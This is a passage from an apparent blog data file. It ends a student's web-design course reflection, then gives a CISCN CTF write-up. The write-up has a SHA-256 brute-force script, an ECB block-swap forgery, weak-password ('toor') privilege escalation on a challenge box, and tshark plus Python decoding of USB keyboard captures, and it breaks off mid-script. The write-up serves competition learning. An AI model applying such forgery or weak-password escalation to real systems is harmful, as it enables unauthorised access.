总结</h3><p>这个站点实际上是我大一初学web前段的目的，当时我和其他几位同学一起参加挑战杯，这个站点和其相应功能是当时没有完成制作出来，虽然现在为止，比如班列定制等功能也没有写出来，至少在前段展示上比当时好了很多。</p><p>另一方面在这一次我其实参考了不少的企业页面，因为这个是一个正经的参加挑战杯和大创的项目介绍，不能做到类似于博客，很多花式的前段效果在这个页面上其实不是很合适。也有很多不够圆满的地方，比如project页面，那四个cord块实际应该链接到项目提供的四项功能，但是两年过去，这些地方还没写完…..</p><p>最后呢，是对老师要求的一些理解失误，比如说那个使用以个外部CSS文件，在后面与老师交流时，刘老师表示是至少一个外部CSS文件而我理解成了只能使用一个外部CSS文件，这是不符合正常的程序设计原则的….所以导致我采用了一种外部CSS样式存储如header，footer，body等标签样式，每个页面中的具体采用的则交给内部CSS样式进行控制。</p><blockquote><p>写在最后，这个大作业还是费了很多力气的，主要是因为老师那些神奇的要求，这边也把本次老师要求附上……</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1、网站内容丰富（包括各种类型的内容：文本、图像、音频、视频等）、功能完备（至少有五个栏目）。（20分）2、HTML代码结构清晰、规范（至少主页包括HTML5新增的结构元素）。（16分）3、整个网站有一外部CSS文件控制所有页面的统一样式，每个页面的个别样式采用内部CSS。（CSS代码书写规范，选择器使用及代码书写顺序合理）（16分）4、网站整体采用HTML+CSS方式布局页面（至少在一个页面采用浮动框架、至少在一个页面采用多列弹性盒、至少在一个页面使用CSS表格），页面布局合理。（18分）5、网站至少包含一个表单页面，表单页面中至少有一个输入栏位采用JS进行合法性验证，并采用pattern。（16）6、至少包含一个动画（CSS）或动态窗口（JS）或CSS响应式设计，至少在一页页面上设置动态样式。（8分）7、目录结构规范、文件名命名规范、各种标识符命名规范。（6分）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这玩意因为我一开始也没怎么考虑这些内容，然后…..看见这个之后大改……..</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debuggerrr²战队CISCN初赛解题记录</title>
      <link href="/2022/06/09/Debuggerrr%C2%B2%E6%88%98%E9%98%9FCISCN%E5%88%9D%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/06/09/Debuggerrr%C2%B2%E6%88%98%E9%98%9FCISCN%E5%88%9D%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h4 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a><strong>签到电台</strong></h4><p>签到题，开始没看到豪密剖析，对照密码表一个一个找的，额。将7个电码和密码本前28个数字每四个一组进行模十加法，看示例是加猜测全部是加运算，得到电码答案后send即可。 </p><h4 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a><strong>基于挑战码的双向认证</strong></h4><p>密码学题目，但完全不是以密码学方法完成的…该题是一道双向验证密文题目，根据题目文档进入 src/login_user 模块，分析<code>proc_login_response</code>函数。一顿分析后发现很多函数看不懂，突然想到题目说明服务端验证函数已完成，找到<code>login_server</code>模块进入查看函数，对照两函数，但是不知道怎么计算<code>Mb</code>来和 <code>Mb</code>对比，思路线索断了。</p><p>题目存在flag验证机制，猜测靶机存在flag文件，开始暴力查找。 </p><p>首先尝试文件名搜索，排除若干无权限文件得到两个 txt 文件，尝试提交，正确。</p><h4 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a><strong>基于挑战码的双向认证2</strong></h4><p>同上。 </p><h4 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a><strong>基于挑战码的双向认证3</strong></h4><p>采取前两道题的思路，无果。 尝试弱密码**(toor)**，提权成功，再次暴力搜索找到flag文件。</p><h4 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a><strong>ISO9798</strong></h4><p>看提示ISO9798-2，额。。没怎么接触过，直接nc看题，发现得知sha256的后部分，直接爆破。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib data<span class="token operator">=</span> <span class="token string">'Gt1DDTjUUYIuQscO'</span> res <span class="token operator">=</span> <span class="token string">'e9e04036a480e68bb4d3897939bafd6dec3767ac9d552d17e000709ac08fefa7'</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                 s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">+</span> data                 <span class="token keyword">if</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> res<span class="token punctuation">:</span>                     <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                     <span class="token keyword">break</span> s <span class="token operator">=</span> <span class="token string">'YWAVGt1DDTjUUYIuQscO'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步提示发送一个128bit的16进制数，python随机生成一个。 </p><p>第三步给了Encrypt(rA||rB||B, k)，要求给出Encrypt(rB||rA, k)，并未给出加密函数，因此猜测是在明 </p><p>文上动一些手脚即可。猜测为ECB或者CBC轮换加密。 </p><p>最后根据加密结果为96位，并且轮换参数有rA，rB，B三个，猜测为ECB加密并且分三组轮换，因此 </p><p>rA,rB和B分别对应密文三部分，要求Encrypt(rB||rA, k)，只需取给出密文的前64位倒置轮换即可。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'83368a8ab47877c4e739d1455a6f15211716f83438b58feba5a83f3c3a5c5774847790a60378dbb 4f39c6400337bbe8c'</span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span> res <span class="token operator">=</span> <span class="token string">'1716f83438b58feba5a83f3c3a5c577483368a8ab47877c4e739d1455a6f1521'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h4 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a><strong>login-nomal</strong></h4><p>拿到文件后，首先 check 一下保护措施,全绿…保护全开</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h4 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a><strong>问卷调查</strong></h4><p>问卷结束后得flag。</p><h4 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a><strong>ez_usb</strong></h4><p>首先题目给的提示是这个是键盘流量，那么我们搜索8个字节长度的数据包，这里发现有两个Destination的数据包的长度是8，说明键盘给两个地方输入了值。</p><p> 利用tshark分别提取出压缩包和压缩密码</p><pre class="line-numbers language-none"><code class="language-none">tshark -r .&#x2F;ez_usb.pcapng -Y &#39;usb.data_len &#x3D;&#x3D; 8&#39; -Y &#39;usb.src &#x3D;&#x3D;&quot;2.8.1&quot;&#39; -T fields -e usb.capdata &gt; 1.txttshark -r .&#x2F;ez_usb.pcapng -Y &#39;usb.data_len &#x3D;&#x3D; 8&#39; -Y &#39;usb.src &#x3D;&#x3D;&quot;2.10.1&quot;&#39; -T fields -e usb.capdata &gt; 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再利用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    keys<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"00"</span><span class="token punctuation">:</span>                 <span class="token keyword">continue</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token 